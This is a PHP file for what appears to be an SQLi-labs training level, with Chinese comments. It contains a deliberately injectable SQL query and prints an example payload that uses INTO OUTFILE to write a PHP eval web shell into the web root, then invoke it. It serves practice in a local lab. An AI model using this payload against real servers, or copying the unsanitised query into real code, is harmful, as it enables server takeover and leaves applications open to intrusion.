<?php
error_reporting(0);
include("../sql-connections/db-creds.inc");

// ===== Less-7：文件写入（INTO OUTFILE getshell）=====
// 后端 SQL：SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1
// 闭合符：'))  → 输入 ') 闭合后接 INTO OUTFILE 写一句话木马
// 前置条件：MySQL 的 secure_file_priv 必须允许该路径（phpstudy 默认常限制，需在 my.ini 设 secure_file_priv="" 或指定目录）

if (isset($_GET['id'])) {
    $id = $_GET['id'];
    mysqli_select_db($con, "security");

    $sql = "SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
    echo "<pre style='color:#c0392b'>DEBUG SQL: $sql</pre>";

    $result = mysqli_query($con, $sql);
    $row = mysqli_fetch_array($result, MYSQLI_BOTH);

    if ($row) {
        echo "You are in.... Use outfile......";   // 提示用 outfile
    } else {
        print_r(mysqli_error($con));
    }
} else {
    echo "本关练文件写入：闭合 ')) 后用 INTO OUTFILE 写马<br>";
    echo "示例：?id=1')) UNION SELECT 1,2,'<?php @eval(\$_POST[1]);?>' INTO OUTFILE 'C:/phpstudy_pro/WWW/sqli-labs/Less-7/shell.php' --+<br>";
    echo "写成功后访问 http://localhost/sqli-labs/Less-7/shell.php ，POST 传 1=phpinfo(); 验证";
}
?>
